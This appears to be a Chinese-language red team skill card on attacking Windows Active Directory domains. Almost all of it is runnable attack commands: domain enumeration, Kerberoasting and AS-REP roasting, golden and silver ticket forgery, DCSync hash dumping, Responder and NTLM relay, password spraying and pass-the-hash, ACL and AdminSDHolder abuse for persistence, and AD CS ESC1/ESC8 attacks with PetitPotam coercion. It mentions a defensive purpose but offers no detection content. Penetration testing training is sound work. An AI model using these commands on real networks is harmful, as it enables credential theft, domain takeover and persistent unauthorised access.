---
id: 27-002
title: "Windows攻击与横向移动技术 (Windows Attack & Lateral Movement)"
category: 操作系统安全
category_en: "OS Security"
difficulty: ★★★★
tools: "Impacket, Mimikatz, Rubeus, BloodHound, CrackMapExec, Responder, Certify"
last_updated: 2026-05
tags: ["os-security", "windows-hardening", "linux-hardening", "macos", "privilege-escalation"]
subdomain: os-security
nist_csf: ["PR.AC-01", "PR.DS-07", "PR.PT-01"]
mitre_attack: ["T1548", "T1552", "T1562"]
---
# Windows攻击与横向移动技术 (Windows Attack & Lateral Movement)

## 概述

Windows 域环境攻击是红队评估和渗透测试的核心能力。本技能覆盖 Active Directory 攻击技术、Kerberos 协议滥用、NTLM 中继攻击、ACL 滥用、域横向移动等关键技术，帮助安全测试人员深入理解 Windows 身份认证机制和安全缺陷，同时为蓝队防御提供检测视角。参考 MITRE ATT&CK 框架和等保2.0 中对域控安全的防护要求。

## 核心技能

### 1. 信息收集与域枚举

```powershell
# 使用 PowerView 进行域信息收集
Import-Module .\PowerView.ps1

# 获取域信息
Get-NetDomain
Get-NetDomainController

# 枚举域用户
Get-NetUser | Select-Object samaccountname, description, pwdlastset, memberof, lastlogontimestamp
Get-NetUser -LDAPFilter "(adminCount=1)" | Select-Object samaccountname, memberof

# 枚举域计算机
Get-NetComputer | Select-Object dnshostname, operatingsystem
Get-NetComputer -Ping

# 查找域管理员
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# 枚举 ACL
Get-ObjectAcl -ResolveGUIDs -SamAccountName "user1"

# 查找 GPO 信息
Get-NetGPO | Select-Object displayname, gpcpath
Get-NetGPO -ComputerName "dc01.domain.com"

# 查找信任关系
Get-NetDomainTrust
Get-NetForestTrust
```

```bash
# 使用 Impacket 远程枚举（Linux 攻击机）
# 枚举域用户
impacket-lookupsid domain/user:password@192.168.1.10

# 使用 BloodHound 收集数据
bloodhound-python -d domain.com -u user -p password -c All -ns 192.168.1.10
```

### 2. Kerberos 协议攻击

```bash
# Kerberoasting — 请求服务票据并离线破解
# 使用 Impacket
impacket-GetUserSPNs -request domain.com/user:password -outputfile kerberoast.txt

# 使用 Rubeus（在有 PowerShell 的 Window 系统上）
.\Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:password /outfile:kerberoast.txt
```

```bash
# AS-REP Roasting — 查找不需要预认证的用户
impacket-GetNPUsers domain.com/user:password -request -outputfile asreproast.txt

# 使用 Rubeus
.\Rubeus.exe asreproast /format:hashcat
```

```bash
# 黄金票据 — 伪造 KRBTGT 票据获取域控访问
# 导出 krbtgt hash（域控上运行）
impacket-secretsdump domain.com/administrator:password@dc01

# 制作黄金票据
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain domain.com administrator

# 使用伪造票据登录
export KRB5CCNAME=ticket.ccache
impacket-psexec domain.com/administrator@dc01 -k -no-pass

# 白银票据 — 伪造服务票据
impacket-ticketer -nthash <service_hash> -domain-sid <domain_sid> -domain domain.com -spn cifs/dc01.domain.com administrator
```

```bash
# DCSync — 模拟域控同步密码哈希
impacket-secretsdump -just-dc domain.com/administrator:password@dc01

# 只 dump 特定用户
impacket-secretsdump -just-dc-user krbtgt domain.com/administrator:password@dc01
```

### 3. NTLM 中继与 SMB 攻击

```bash
# Responder — 捕获网络内的 NTLM 认证请求
sudo responder -I eth0 -w -f -v

# NTLM 中继攻击 — 将捕获的认证中继到目标机器
# 步骤 1：启动 SMB 服务器（接收中继的认证）
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# 步骤 2：启动 Responder 关闭 SMB/HTTP 代理
sudo responder -I eth0 -w -f --lm disable

# NTLMv1 降级攻击
# 修改注册表强制使用 NTLMv1（目标机器）
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 1

# SMB 中继 — Printer Bug（MS-RPRN）
# 利用 Windows Printer Spooler 服务强制指定机器发起认证
impacket-rpcdump @target_ip
impacket-rpcdump @target_ip | grep -i printer

# 触发 Printer Bug（使用 dementor.py）
python3 dementor.py -d domain.com -u user -p password <attacker_ip> <target_ip>
```

```bash
# CrackMapExec — 批量横向移动
# 密码喷洒
crackmapexec smb 192.168.1.0/24 -u users.txt -p password123 --local-auth

# 使用哈希传递
crackmapexec smb 192.168.1.0/24 -u administrator -H <ntlm_hash> --local-auth

# 使用明文密码
crackmapexec winrm 192.168.1.0/24 -u administrator -p password123

# 查看 SMB 共享
crackmapexec smb 192.168.1.10 -u user -p password --shares

# 执行命令
crackmapexec smb 192.168.1.10 -u user -p password -x whoami

# 检查 MS17-010 漏洞
crackmapexec smb 192.168.1.0/24 -u user -p password -M ms17-010
```

### 4. ACL 滥用与特权委派攻击

```powershell
# 使用 PowerView 查找可利用的 ACL
# 查找拥有对用户 GenericAll 权限的账户
Find-InterestingDomainAcl -ResolveGUIDs

# 查找拥有对用户 ResetPassword 权限的账户
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight"}

# 滥用 ACL：重置目标用户密码（拥有 GenericAll 权限时）
net user targetuser NewP@ssword123! /domain

# 滥用 ACL：向目标用户添加 DCSync 权限
Add-ObjectAcl -TargetSamAccountName "dc01" -PrincipalSamAccountName "controlleduser" -Rights DCSync

# AdminSDHolder 滥用 — 持续控制特权账户
# 修改 AdminSDHolder ACL，使特权账户可被普通用户控制
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity "controlleduser" -Rights GenericAll

# 等待 60 分钟（SDProp 周期）或强制触发
# 强制触发：修改 AdminSDHolder 对象
```

```bash
# 使用 Impacket 进行基于 ACL 的 DCSync
impacket-secretsdump -just-dc domain.com/controlleduser:password@dc01
```

### 5. AD 证书服务攻击

```bash
# Certify — 枚举 AD CS 漏洞
.\Certify.exe find /vulnerable
.\Certify.exe find /ca:CA01.domain.com

# 查找 ESC1 漏洞（允许域用户通过 SAN 配置申请证书）
# 条件：Manager Approval = Disabled + Authorized Signatures = 0

# ESC1 利用 — 申请域管理员证书
.\Certify.exe request /ca:CA01.domain.com /template:VulnTemplate /altname:administrator

# 使用证书进行 Kerberos 认证
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /domain:domain.com

# ESC8 — NTLM 中继到 AD CS
# 步骤 1：启动 NTLM 中继到 AD CS Web 接口
impacket-ntlmrelayx -t http://ca01.domain.com/certsrv/certfnsh.asp -smb2support -adcs

# 步骤 2：触发目标机器向中继认证
# （Printer Bug, PetitPotam 等）

# PetitPotam — 触发域控向攻击者认证
python3 petitpotam.py attacker_ip dc01.domain.com
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Impacket | AD 协议攻击工具集 | https://github.com/fortra/impacket |
| Mimikatz | 凭证提取与哈希传递 | https://github.com/gentilkiwi/mimikatz |
| Rubeus | Kerberos 攻击工具 | https://github.com/GhostPack/Rubeus |
| BloodHound | AD 攻击路径分析 | https://github.com/BloodHoundAD/BloodHound |
| CrackMapExec | 横向移动自动化工具 | https://github.com/byt3bl33d3r/CrackMapExec |
| Responder | NTLM 认证捕获 | https://github.com/lgandx/Responder |
| Certify | AD CS 攻击枚举 | https://github.com/GhostPack/Certify |

## 参考资源

- [MITRE ATT&CK — TA0008 Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [MITRE ATT&CK — T1550 Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [BloodHound Academy — AD 攻击路径](https://bloodhoundacademy.com/)
- [Kerberos Attacks Explained — Harmj0y](https://blog.harmj0y.net/)
- [AD CS Attack Theory — SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cb2)
- [NTLM Relay Attack — HackTricks](https://book.hacktricks.xyz/windows-hardening/ntlm/ntlm-relay-attack)
- [等保2.0 三级 — 域控安全防护要求](https://openstd.samr.gov.cn/)
- [NIST SP 800-63B — Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
